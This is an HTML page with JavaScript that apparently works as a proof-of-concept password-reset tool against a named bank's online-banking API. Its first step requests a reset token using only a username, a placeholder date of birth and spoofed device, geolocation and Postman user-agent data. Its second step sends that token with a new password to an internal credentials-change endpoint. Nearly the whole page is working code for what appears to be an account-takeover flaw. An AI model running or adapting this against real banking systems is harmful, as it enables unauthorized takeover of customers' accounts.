<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Reset Password</title>
  <meta name="referrer" content="no-referrer" />
  <style>
    body { font-family: Arial, sans-serif; margin: 20px; }
    input, button { margin: 10px 0; padding: 8px; width: 300px; }
    #status { margin-top: 20px; font-weight: bold; }
  </style>
</head>
<body>
  <h2>Step 1: Get Token</h2>
  <label>Username: <input type="text" id="username" /></label><br>
  <button onclick="getToken()">Get Token</button>

  <div id="tokenSection" style="display:none;">
    <h2>Step 2: Reset Password</h2>
    <label>New Password: <input type="password" id="newPassword" /></label><br>
    <button onclick="resetPassword()">Reset Password</button>
  </div>

  <p id="status"></p>

  <script>
    let token = "";

    const customHeaders = {
      "Content-Type": "application/json",
      "Accept": "*/*",
      "User-Agent": "PostmanRuntime/7.49.0",
      "Connection": "keep-alive"
    };

    async function getToken() {
      const username = document.getElementById('username').value;
      const status = document.getElementById('status');
      status.textContent = 'Requesting token...';

      const payload = {
        userId: username,
        dateOfBirth: "1700-04-11",
        dictionaryArray: [
          { nameValuePairDTOArray: [] },
          {
            nameValuePairDTOArray: [
              { name: "geo_location", value: "31.5180296;74.3438491" },
              { name: "registered_device", value: "" },
              { name: "device_os", value: "Linux" },
              { name: "country_code", value: "PK" }
            ]
          }
        ]
      };

      try {
        const response = await fetch("https://obdx-uat.mcb.com.pk/digx/cz/v1/czcredentials/forgotCredentials?locale=en", {
          method: "POST",
          headers: customHeaders,
          body: JSON.stringify(payload),
          referrerPolicy: "no-referrer"
        });

        const data = await response.json();
        if (data.token) {
          token = data.token;
          status.textContent = 'Token received. Enter new password below.';
          document.getElementById('tokenSection').style.display = 'block';
        } else {
          status.textContent = 'Failed to retrieve token.';
        }
      } catch (error) {
        console.error(error);
        status.textContent = 'Error occurred while requesting token.';
      }
    }

    async function resetPassword() {
      const newPassword = document.getElementById('newPassword').value;
      const status = document.getElementById('status');
      status.textContent = 'Resetting password...';

      const payload = {
        newPassword: newPassword,
        token: token
      };

      try {
        const response = await fetch("https://10.0.102.141/digx/v1/credentials/changeCredentials?locale=en", {
          method: "PUT",
          headers: customHeaders,
          body: JSON.stringify(payload),
          referrerPolicy: "no-referrer"
        });

        const data = await response.json();
        if (data.status?.result === "SUCCESSFUL") {
          status.textContent = 'Password reset successful!';
        } else {
          status.textContent = 'Password reset failed.';
        }
      } catch (error) {
        console.error(error);
        status.textContent = 'Error occurred while resetting password.';
      }
    }
  </script>
</body>
</html>
